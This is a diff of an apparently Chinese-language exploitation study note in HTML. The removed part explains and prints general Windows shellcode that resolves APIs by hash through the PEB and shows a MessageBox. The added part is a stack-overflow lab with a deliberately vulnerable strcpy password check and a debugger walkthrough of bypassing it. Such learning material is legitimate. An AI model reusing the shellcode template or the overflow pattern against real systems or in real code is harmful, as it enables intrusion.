@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-<title>3.2Calculate digest of function name for general shellcode</title>
+<title>2.2Nearby var overrun in stack</title>
 <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
 <style type="text/css">
 /* GitHub stylesheet for MarkdownPad (http://markdownpad.com) */
@@ -468,236 +468,212 @@ vertical-align:1px;
 </style>
 </head>
 <body>
-<h1 id="calculate-digest-of-function-name-for-general-shellcode">Calculate digest of function name for general shellcode</h1>
-<p><strong>Author：wnagzihxain<br>Mail：tudouboom@163.com</strong></p>
+<h1 id="nearby-var-overrun-in-stack">Nearby var overrun in stack</h1>
+<p><strong>Author：wnagzihxa1n<br>Mail：tudouboom@163.com</strong></p>
 <pre><code>#include &lt;stdio.h&gt;
 #include &lt;windows.h&gt;
 
-DWORD GetHash(char *fun_name)
+#define PASSWORD &quot;1234567&quot;
+
+int verify_password (char *password)
 {
-    DWORD digest = 0;
-    while(*fun_name)
-    {
-        digest = ((digest&lt;&lt;25) | (digest&gt;&gt;7));
-        digest += *fun_name ;
-        fun_name++;
-    }
-    return digest;
+    int authenticated;
+    char buffer[8];// add local buff
+    printf(&quot;call the strcmp()\n&quot;);
+    system(&quot;pause&quot;);
+    authenticated = strcmp(password, PASSWORD);
+    printf(&quot;call the strcpy()\n&quot;);
+    system(&quot;pause&quot;);
+    strcpy(buffer, password);//over flowed here!    
+    return authenticated;
 }
 
-int main()
+int main(int argc, char **argv, char **envp)
 {
-    DWORD hash;
-    hash = GetHash(&quot;MessageBoxA&quot;);
-    printf(&quot;result of hash is %.8x\n&quot;, hash);
+    int valid_flag = 0;
+    char password[1024];
+    while(1)
+    {
+        printf(&quot;1.input\n&quot;);
+        system(&quot;pause&quot;);
+        printf(&quot;please input password:       &quot;);
+        scanf(&quot;%s&quot;, password);
+        printf(&quot;call the verify_password()\n&quot;);
+        system(&quot;pause&quot;);
+        valid_flag = verify_password(password);
+        printf(&quot;if branch\n&quot;);
+        system(&quot;pause&quot;);
+        if(valid_flag)
+        {
+            printf(&quot;incorrect password!\n\n&quot;);
+        }
+        else
+        {
+            printf(&quot;Congratulation! You have passed the verification!\n&quot;);
+            break;
+        }
+    }
+    printf(&quot;game over :)\n&quot;);
+    system(&quot;pause&quot;);
     return 0;
 }
-</code></pre><p>这是用于hash函数名的代码</p>
-<pre><code>int main()
-{    
-    _asm{
-            nop
-            nop
-            nop
-            nop
-            nop
-            CLD                    ; clear flag DF
-            ;store hash
-            push 0x1e380a6a        ;hash of MessageBoxA
-            push 0x4fd18963        ;hash of ExitProcess
-            push 0x0c917432        ;hash of LoadLibraryA
-            mov esi,esp            ; esi = addr of first function hash 
-            lea edi,[esi-0xc]    ; edi = addr to start writing function 
+</code></pre><p>生成PE文件，载入OD</p>
+<p><img src="Image/1.png" alt=""></p>
+<p>F9跑起来可以看到已经被第一个pause断下来了</p>
+<p><img src="Image/2.png" alt=""></p>
+<p>暂停程序，然后点击K，找到刚刚的pause调用，右击显示调用跳到调用的汇编代码</p>
+<p><img src="Image/3.png" alt=""></p>
+<p>可以看到这是main函数领空，先给下个断点</p>
+<pre><code>printf(&quot;1.input\n&quot;);
+system(&quot;pause&quot;);
+printf(&quot;please input password:       &quot;);
+</code></pre><p><img src="Image/4.png" alt=""></p>
+<p>往下走，这是调用scanf的代码，从调用名就可以看出来，或者看到上面压了一个%s到栈里也可以判断，输入七个“q”</p>
+<pre><code>scanf(&quot;%s&quot;, password);
+</code></pre><p><img src="Image/5.png" alt=""></p>
+<p>回车继续，发现暂停了，暂停的位置在verify_password()</p>
+<p>到了判断密码的函数了，C语言代码如下：</p>
+<pre><code>printf(&quot;call the verify_password()\n&quot;);
+system(&quot;pause&quot;);
+</code></pre><p><img src="Image/6.png" alt=""></p>
+<p>调用verify_password();</p>
+<pre><code>valid_flag = verify_password(password);
+</code></pre><p><img src="Image/8.png" alt=""></p>
+<p>继续回车，碰到pause，依旧暂停，点击k</p>
+<p><img src="Image/9.png" alt=""></p>
+<p>这是verify_password()函数的领空，这是刚才的pause</p>
+<p><img src="Image/10.png" alt=""></p>
+<p>往下看，这个是调用strcmp的压栈操作，C语言代码：</p>
+<pre><code>authenticated = strcmp(password, PASSWORD);
+</code></pre><p><img src="Image/11.png" alt=""></p>
+<p>回车走下去，碰到pause，依旧暂停找调用</p>
+<p><img src="Image/12.png" alt=""></p>
+<p>调用pause的位置</p>
+<p><img src="Image/13.png" alt=""></p>
+<p>往下拉，这是strcpy，C语言代码：</p>
+<pre><code>strcpy(buffer, password);
+</code></pre><p><img src="Image/14.png" alt=""></p>
+<p>然后再回车其实就没了</p>
+<p><img src="Image/15.png" alt=""></p>
+<p>熟悉了一遍整个程序运行的过程之后，重新修改代码，去掉不需要的pause</p>
+<pre><code>#include &lt;stdio.h&gt;
 
-            ; make some stack space
-            xor ebx,ebx
-            mov bh, 0x04              
-            sub esp, ebx 
+#define PASSWORD &quot;1234567&quot;
 
-            ; push a pointer to &quot;user32&quot; onto stack 
-            mov bx, 0x3233         ; rest of ebx is null 
-            push ebx 
-            push 0x72657375 
-            push esp 
-            xor edx,edx
+int verify_password (char *password)
+{
+    int authenticated;
+    char buffer[8];// add local buff
+    authenticated = strcmp(password, PASSWORD);
+    strcpy(buffer, password);//over flowed here!    
+    return authenticated;
+}
 
-        ; find base addr of kernel32.dll 
-            mov ebx, fs:[edx + 0x30]     ; ebx = address of PEB 
-            mov ecx, [ebx + 0x0c]         ; ecx = pointer to loader data 
-            mov ecx, [ecx + 0x1c]         ; ecx = first entry in initialisation order list 
-            mov ecx, [ecx]                 ; ecx = second entry in list (kernel32.dll) 
-            mov ebp, [ecx + 0x08]         ; ebp = base address of kernel32.dll 
-
-        find_lib_functions: 
-            lodsd                     ; load next hash into al and increment esi 
-            cmp eax, 0x1e380a6a        ; hash of MessageBoxA - trigger 
-                                    ; LoadLibrary(&quot;user32&quot;) 
-            jne find_functions 
-            xchg eax, ebp             ; save current hash 
-            call [edi - 0x8]         ; LoadLibraryA 
-            xchg eax, ebp             ; restore current hash, and update ebp 
-                                    ; with base address of user32.dll 
-
-        find_functions: 
-            pushad                         ; preserve registers 
-            mov eax, [ebp + 0x3c]        ; eax = start of PE header 
-            mov ecx, [ebp + eax + 0x78]    ; ecx = relative offset of export table 
-            add ecx, ebp                 ; ecx = absolute addr of export table 
-            mov ebx, [ecx + 0x20]         ; ebx = relative offset of names table 
-            add ebx, ebp                 ; ebx = absolute addr of names table 
-            xor edi, edi                 ; edi will count through the functions 
-
-        next_function_loop: 
-            inc edi                     ; increment function counter 
-            mov esi, [ebx + edi * 4]     ; esi = relative offset of current function name 
-            add esi, ebp                 ; esi = absolute addr of current function name 
-            cdq                         ; dl will hold hash (we know eax is small) 
-
-        hash_loop: 
-            movsx eax, byte ptr[esi]
-            cmp al,ah
-            jz compare_hash
-            ror edx,7
-            add edx,eax
-            inc esi
-            jmp hash_loop
-
-        compare_hash:    
-            cmp edx, [esp + 0x1c]         ; compare to the requested hash (saved on stack from pushad) 
-            jnz next_function_loop 
-            mov ebx, [ecx + 0x24]         ; ebx = relative offset of ordinals table 
-            add ebx, ebp                 ; ebx = absolute addr of ordinals table 
-            mov di, [ebx + 2 * edi]     ; di = ordinal number of matched function 
-            mov ebx, [ecx + 0x1c]         ; ebx = relative offset of address table 
-            add ebx, ebp                 ; ebx = absolute addr of address table 
-            add ebp, [ebx + 4 * edi]     ; add to ebp (base addr of module) the 
-                                        ; relative offset of matched function 
-            xchg eax, ebp                 ; move func addr into eax 
-            pop edi                     ; edi is last onto stack in pushad 
-            stosd                         ; write function addr to [edi] and increment edi 
-            push edi 
-            popad                    ; restore registers 
-                                     ; loop until we reach end of last hash 
-            cmp eax,0x1e380a6a
-            jne find_lib_functions 
-
-        function_call:
-            xor ebx,ebx
-            push ebx            // cut string
-            push 0x74736577
-            push 0x6C696166        //push failwest
-            mov eax,esp            //load address of failwest
-            push ebx    
-            push eax
-            push eax
-            push ebx
-            call [edi - 0x04] ; //call MessageboxA
-            push ebx
-            call [edi - 0x08] ; // call ExitProcess
-            nop
-            nop
-            nop
-            nop
+int main(int argc, char **argv, char **envp)
+{
+    int valid_flag = 0;
+    char password[1024];
+    while(1)
+    {
+        printf(&quot;please input password:       &quot;);
+        scanf(&quot;%s&quot;, password);
+        valid_flag = verify_password(password);
+        if(valid_flag)
+        {
+            printf(&quot;incorrect password!\n\n&quot;);
+        }
+        else
+        {
+            printf(&quot;Congratulation! You have passed the verification!\n&quot;);
+            break;
+        }
     }
+    system(&quot;pause&quot;);
     return 0;
 }
-</code></pre><p>这是最终的代码，用于搜索API地址</p>
-<p>我们生成exe，然后载入OD，提取出汇编</p>
-<pre><code>&quot;\x90&quot;//                        NOP
-&quot;\xFC&quot;
-&quot;\x68\x6A\x0A\x38\x1E&quot;//        PUSH 1E380A6A
-&quot;\x68\x63\x89\xD1\x4F&quot;//        PUSH 4FD18963
-&quot;\x68\x32\x74\x91\x0C&quot;//        PUSH 0C917432
-&quot;\x8B\xF4&quot;//                    MOV ESI,ESP
-&quot;\x8D\x7E\xF4&quot;//                LEA EDI,DWORD PTR DS:[ESI-C]
-&quot;\x33\xDB&quot;//                    XOR EBX,EBX
-&quot;\xB7\x04&quot;//                    MOV BH,4
-&quot;\x2B\xE3&quot;//                    SUB ESP,EBX
-&quot;\x66\xBB\x33\x32&quot;//            MOV BX,3233
-&quot;\x53&quot;//                        PUSH EBX
-&quot;\x68\x75\x73\x65\x72&quot;//        PUSH 72657375
-&quot;\x54&quot;//                        PUSH ESP
-&quot;\x33\xD2&quot;//                    XOR EDX,EDX
-&quot;\x64\x8B\x5A\x30&quot;//            MOV EBX,DWORD PTR FS:[EDX+30]
-&quot;\x8B\x4B\x0C&quot;//                MOV ECX,DWORD PTR DS:[EBX+C]
-&quot;\x8B\x49\x1C&quot;//                MOV ECX,DWORD PTR DS:[ECX+1C]
-&quot;\x8B\x09&quot;//                    MOV ECX,DWORD PTR DS:[ECX]
-&quot;\x8B\x69\x08&quot;//                MOV EBP,DWORD PTR DS:[ECX+8]
-&quot;\xAD&quot;//                        LODS DWORD PTR DS:[ESI]
-&quot;\x3D\x6A\x0A\x38\x1E&quot;//        CMP EAX,1E380A6A
-&quot;\x75\x05&quot;//                    JNZ SHORT popup_co.00401070
-&quot;\x95&quot;//                        XCHG EAX,EBP
-&quot;\xFF\x57\xF8&quot;//                CALL DWORD PTR DS:[EDI-8]
-&quot;\x95&quot;//                        XCHG EAX,EBP
-&quot;\x60&quot;//                        PUSHAD
-&quot;\x8B\x45\x3C&quot;//                MOV EAX,DWORD PTR SS:[EBP+3C]
-&quot;\x8B\x4C\x05\x78&quot;//            MOV ECX,DWORD PTR SS:[EBP+EAX+78]
-&quot;\x03\xCD&quot;//                    ADD ECX,EBP
-&quot;\x8B\x59\x20&quot;//                MOV EBX,DWORD PTR DS:[ECX+20]
-&quot;\x03\xDD&quot;//                    ADD EBX,EBP
-&quot;\x33\xFF&quot;//                    XOR EDI,EDI
-&quot;\x47&quot;//                        INC EDI
-&quot;\x8B\x34\xBB&quot;//                MOV ESI,DWORD PTR DS:[EBX+EDI*4]
-&quot;\x03\xF5&quot;//                    ADD ESI,EBP
-&quot;\x99&quot;//                        CDQ
-&quot;\x0F\xBE\x06&quot;//                MOVSX EAX,BYTE PTR DS:[ESI]
-&quot;\x3A\xC4&quot;//                    CMP AL,AH
-&quot;\x74\x08&quot;//                    JE SHORT popup_co.00401097
-&quot;\xC1\xCA\x07&quot;//                ROR EDX,7
-&quot;\x03\xD0&quot;//                    ADD EDX,EAX
-&quot;\x46&quot;//                        INC ESI
-&quot;\xEB\xF1&quot;//                    JMP SHORT popup_co.00401088
-&quot;\x3B\x54\x24\x1C&quot;//            CMP EDX,DWORD PTR SS:[ESP+1C]
-&quot;\x75\xE4&quot;//                    JNZ SHORT popup_co.00401081
-&quot;\x8B\x59\x24&quot;//                MOV EBX,DWORD PTR DS:[ECX+24]
-&quot;\x03\xDD&quot;//                    ADD EBX,EBP
-&quot;\x66\x8B\x3C\x7B&quot;//            MOV DI,WORD PTR DS:[EBX+EDI*2]
-&quot;\x8B\x59\x1C&quot;//                MOV EBX,DWORD PTR DS:[ECX+1C]
-&quot;\x03\xDD&quot;//                    ADD EBX,EBP
-&quot;\x03\x2C\xBB&quot;//                ADD EBP,DWORD PTR DS:[EBX+EDI*4]
-&quot;\x95&quot;//                        XCHG EAX,EBP
-&quot;\x5F&quot;//                        POP EDI
-&quot;\xAB&quot;//                        STOS DWORD PTR ES:[EDI]
-&quot;\x57&quot;//                        PUSH EDI
-&quot;\x61&quot;//                        POPAD
-&quot;\x3D\x6A\x0A\x38\x1E&quot;//        CMP EAX,1E380A6A
-&quot;\x75\xA9&quot;//                    JNZ SHORT popup_co.00401063
-&quot;\x33\xDB&quot;//                    XOR EBX,EBX
-&quot;\x53&quot;//                        PUSH EBX
-&quot;\x68\x77\x65\x73\x74&quot;//        PUSH 74736577
-&quot;\x68\x66\x61\x69\x6C&quot;//        PUSH 6C696166
-&quot;\x8B\xC4&quot;//                    MOV EAX,ESP
-&quot;\x53&quot;//                        PUSH EBX
-&quot;\x50&quot;//                        PUSH EAX
-&quot;\x50&quot;//                        PUSH EAX
-&quot;\x53&quot;//                        PUSH EBX
-&quot;\xFF\x57\xFC&quot;//                CALL DWORD PTR DS:[EDI-4]
-&quot;\x53&quot;//                        PUSH EBX
-&quot;\xFF\x57\xF8&quot;;//                CALL DWORD PTR DS:[EDI-8]
-</code></pre><p>整理一下</p>
-<pre><code>char popup_general[]=
-&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;
-&quot;\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53&quot;
-&quot;\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B&quot;
-&quot;\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95&quot;
-&quot;\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59&quot;
-&quot;\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A&quot;
-&quot;\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75&quot;
-&quot;\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03&quot;
-&quot;\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB&quot;
-&quot;\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50&quot;
-&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8&quot;;
+</code></pre><p>编译后运行</p>
+<p><img src="Image/16.png" alt=""></p>
+<p>这是主函数的入口，下断，然后重新载入</p>
+<p><img src="Image/17.png" alt=""></p>
+<p>F9运行到断点，F7跟入，有一个跳转，继续单步走</p>
+<p><img src="Image/18.png" alt=""></p>
+<p>这是main函数的领空</p>
+<p><img src="Image/19.png" alt=""></p>
+<p>这是调用scanf函数</p>
+<pre><code>scanf(&quot;%s&quot;, password);
+</code></pre><p><img src="Image/20.png" alt=""></p>
+<p>F8单步走下来，开始调用verify_password()，F7单步跟入</p>
+<p><img src="Image/21.png" alt=""></p>
+<p>碰到跳转，继续单步</p>
+<p><img src="Image/22.png" alt=""></p>
+<p>单步走下来注意看栈里的变化</p>
+<p><img src="Image/23.png" alt=""></p>
+<p>单步走到这，这是将strcmp比较的结果赋值给authenticated变量</p>
+<p>同时注意栈里的变化</p>
+<p><img src="Image/24.png" alt=""></p>
+<pre><code>0012FB14   CCCCCCCC  烫烫
+0012FB18   CCCCCCCC  烫烫
+0012FB1C   CCCCCCCC  烫烫
+0012FB20   CCCCCCCC  烫烫
+0012FB24  /0012FF80  € .
+0012FB28  |004010EB  ?@.   返回到 stack_ov.004010EB 来自 stack_ov.00401005
+0012FB2C  |0012FB7C  |?.   ASCII &quot;qqqqqqq&quot;
+0012FB30  |0012B74C  L?.
+</code></pre><p>变成了</p>
+<pre><code>0012FB14   CCCCCCCC  烫烫
+0012FB18   CCCCCCCC  烫烫
+0012FB1C   CCCCCCCC  烫烫
+0012FB20   00000001   ...
+0012FB24  /0012FF80  € .
+0012FB28  |004010EB  ?@.   返回到 stack_ov.004010EB 来自 stack_ov.00401005
+0012FB2C  |0012FB7C  |?.   ASCII &quot;qqqqqqq&quot;
+0012FB30  |0012B74C  L?.
+</code></pre><p>然后就是调用strcpy进行复制，依旧要注意栈的变化</p>
+<p><img src="Image/25.png" alt=""></p>
+<p>栈变化</p>
+<pre><code>0012FB14   CCCCCCCC  烫烫
+0012FB18   71717171  qqqq
+0012FB1C   00717171  qqq.
+0012FB20   00000001   ...
+0012FB24  /0012FF80  € .
+0012FB28  |004010EB  ?@.   返回到 stack_ov.004010EB 来自 stack_ov.00401005
+0012FB2C  |0012FB7C  |?.   ASCII &quot;qqqqqqq&quot;
+0012FB30  |0012B74C  L?.
+</code></pre><p><img src="Image/26.png" alt=""></p>
+<p>好了，到这里大概就清楚了流程，可以看到authenticated变量在内存中的位置刚好在buffer数组下面，如果buffer数组过长就会覆盖authenticated变量的值</p>
+<p>取消其它所有断点，只在</p>
+<pre><code>00401054    E8 17010000     call stack_ov.strcpysgzeHeaderListle_pag&gt;
+</code></pre><p>下一个断点，重新运行起来，输入8个q</p>
+<p><img src="Image/27.png" alt=""></p>
+<p>回车，注意栈</p>
+<pre><code>0012FB14   CCCCCCCC  烫烫
+0012FB18   CCCCCCCC  烫烫
+0012FB1C   CCCCCCCC  烫烫
+0012FB20   00000001   ...
+0012FB24  /0012FF80  € .
+0012FB28  |004010EB  ?@.   返回到 stack_ov.004010EB 来自 stack_ov.00401005
+0012FB2C  |0012FB7C  |?.   ASCII &quot;qqqqqqqq&quot;
+0012FB30  |0012B74C  L?.
+</code></pre><p>F8单步走，可以看到栈里的变化</p>
+<pre><code>0012FB14   CCCCCCCC  烫烫
+0012FB18   71717171  qqqq
+0012FB1C   71717171  qqqq
+0012FB20   00000000  ....
+0012FB24  /0012FF80  € .
+0012FB28  |004010EB  ?@.   返回到 stack_ov.004010EB 来自 stack_ov.00401005
+0012FB2C  |0012FB7C  |?.   ASCII &quot;qqqqqqqq&quot;
+0012FB30  |0012B74C  L?.
+</code></pre><p>已经覆盖掉了authenticated变量，返回的结果为0，因为字符串会在最后面加上一个结束符</p>
+<p>而buffer定义的时候只有8字节，所以8个q加上结束符，结束符就会覆盖authenticated变量在内存中的位置</p>
+<p><img src="Image/28.png" alt=""></p>
+<p>至于最后留下的关于输入比&quot;1234567&quot;小的字符串的问题，挺有意思的</p>
+<p>先在调用strcpy的地方下断点，重新载入，F9运行，输入&quot;01234567&quot;，观察栈的变化</p>
+<p><img src="Image/29.png" alt=""></p>
+<p>如图右击，修改堆栈值，F9继续运行</p>
+<p><img src="Image/30.png" alt=""></p>
+<p>妥了</p>
+<p><img src="Image/31.png" alt=""></p>
 
-void main()
-{
-    __asm
-    {
-        lea eax,popup_general
-        push eax
-        ret
-    }
-}
-</code></pre>
 </body>
 </html>
 <!-- This document was created with MarkdownPad, the Markdown editor for Windows (http://markdownpad.com) -->
